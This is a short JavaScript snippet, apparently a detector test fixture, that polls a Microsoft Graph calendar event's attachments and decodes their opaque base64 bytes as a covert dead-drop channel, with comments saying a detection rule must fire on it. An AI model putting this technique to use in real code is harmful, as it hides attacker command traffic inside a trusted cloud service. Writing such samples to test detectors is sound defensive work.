// Hand-written Graph calendar dead-drop read: polls an event's attachments
// and decodes the opaque bytes. No generator markers anywhere, so the
// suspicious opaque-attachment-read composite must still fire here.
const listUrl = 'https://graph.microsoft.com/v1.0/me/events/' + eventId + '/attachments';
const listing = await (await fetch(listUrl, { headers })).json();
for (const item of listing.value) {
    // @odata.type #microsoft.graph.fileAttachment carries contentBytes
    const body = await (await fetch(item['@odata.id'])).json();
    const raw = Buffer.from(body.contentBytes, 'base64');
    handle('application/octet-stream', raw);
}
